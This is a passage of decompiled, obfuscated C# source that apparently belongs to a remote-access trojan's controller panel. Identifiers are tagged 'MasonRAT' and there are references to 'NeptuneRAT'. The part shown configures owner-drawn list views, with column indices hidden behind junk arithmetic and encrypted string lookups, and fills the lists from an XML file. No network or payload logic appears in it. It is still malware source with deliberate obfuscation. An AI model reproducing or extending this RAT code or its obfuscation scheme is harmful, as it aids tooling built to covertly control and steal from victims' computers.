    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[(1031727054 + 1036064749 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ ((232566754 ^ (1029797113 | 663188123)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 | 1739959693 + 2118609598 % 448371815 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[(527850496 - (1524818748 >> 648542978) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (1127115589 - 980469785 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[((576957905 > 4735716 ? 571712192 : 762282922) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 > 776110732 + (1235276669 << 1878196674) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ? 218937 - (1793472923 >> 1329742605) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 : (1342889456 >> 1662764013) - 163920 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[(-1904242361 - 260085239 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ ((1473488144 > 1378961999 ? 184197973 : 245597297) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 | -333831548 - 1846913586 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[((-1790597232 - 1201354302 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) > 1209879822 - (1853179101 >> 567113948) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ? 418946336 % 1071692883 - 418946328 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 : (468022904 | 1014215552) - 1073215470 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[1663236952 + -1175446632 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + -((487790330 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[(-534764906 - 1059004938 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (-2130027610 - 708829058 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 | (217499478 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.View = View.Details;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.HideSelection = false;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.OwnerDraw = true;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.GridLines = false;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.DrawColumnHeader += new DrawListViewColumnHeaderEventHandler(this.\u2694️MasonRAT\u270C̍ڙؤڙۡــٺ\u0609ﻼ\u0609ٺڼـمﻻـ);
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.DrawItem += new DrawListViewItemEventHandler(this.\u2694️MasonRAT\u270Cﻋڝ\u060A\u0608\u0608ﻼۚ\u060Aــڙڠﻼ\u060Bـ\u0608ﮪڝ);
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.DrawSubItem += new DrawListViewSubItemEventHandler(this.\u2694️MasonRAT\u270Cـڕٸدڙـــ\u0609طؤ\u0608\u0608\u060E\u060E);
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.Columns[0].TextAlign = (HorizontalAlignment) ((1631315983 - (466069817 >> 1557791748) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ (1300052426 + (1285857729 >> 2105860593) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | (-902938341 ^ ~601027462) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1));
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.Columns[1].TextAlign = (HorizontalAlignment) ((289123757 - (103717666 >> 1151812435) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ ((1778282024 ^ 319134647 % 1299060722) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) % ((1527917097 | 941958560) - 293005044 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.Columns[((-2124212417 ^ ~534861209) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + -(94744663 + (1622650906 << 2110273927) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)].TextAlign = (HorizontalAlignment) (((1018569653 | 179456657) - 1052142515 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ 612839790 - (913110778 >> 1541746129) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> (110798268 + 1900135971 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0));
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.Columns[((39768994 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - ((-619285072 ^ -1147286847) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) % (~1451610234 - 2053355944 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0].TextAlign = (HorizontalAlignment) ((1257916528 + 288220955 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (-1585591311 - 1163238504 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1));
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.View = View.Details;
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.HideSelection = false;
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.OwnerDraw = true;
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.GridLines = false;
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.DrawColumnHeader += new DrawListViewColumnHeaderEventHandler(this.\u2694️MasonRAT\u270C\u0608\u060Dﮪ\u060Bــا\u060Aٺۭــــ\u060Dٺــ);
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.DrawItem += new DrawListViewItemEventHandler(this.\u2694️MasonRAT\u270Cﻋڝ\u060A\u0608\u0608ﻼۚ\u060Aــڙڠﻼ\u060Bـ\u0608ﮪڝ);
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.DrawSubItem += new DrawListViewSubItemEventHandler(this.\u2694️MasonRAT\u270Cـڕٸدڙـــ\u0609طؤ\u0608\u0608\u060E\u060E);
    try
    {
      XElement xelement = XElement.Load(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1398));
      try
      {
        foreach (XElement descendant in xelement.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1399), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1400))))
        {
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items.AddRange(new ListViewItem[1]
          {
            new ListViewItem(NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1401), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1402)))), 0)
            {
              SubItems = {
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1403), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1404)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1405), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1406)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1407), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1408)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1409), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1410)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1411), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1412)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1413), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1414)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1415), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1416)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1417), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1418)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1419), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1420)))),
